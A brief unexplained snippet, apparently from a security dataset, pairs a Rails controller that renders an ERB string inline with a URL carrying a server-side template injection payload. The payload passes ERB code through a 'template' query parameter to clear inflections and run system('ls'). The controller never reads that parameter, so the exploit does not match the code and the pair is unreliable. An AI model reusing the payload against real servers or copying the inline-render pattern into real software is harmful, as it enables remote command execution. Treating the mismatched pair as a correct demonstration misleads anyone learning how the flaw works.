Source code:

```
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])
    @template = "
      <html>
        <body>
          <h1><%= @product.name %></h1>
          <p><%= @product.description %></p>
          <p>Price: <%= @product.price %></p>
        </body>
      </html>
    "
    render :inline => @template, :locals => {:product => @product}
  end
end
```

```http://localhost:3000/products/1?template=<%= ActiveSupport::Inflector.inflections.clear; ActiveSupport::Inflector.inflections.plural 'person'; system('ls') %>```
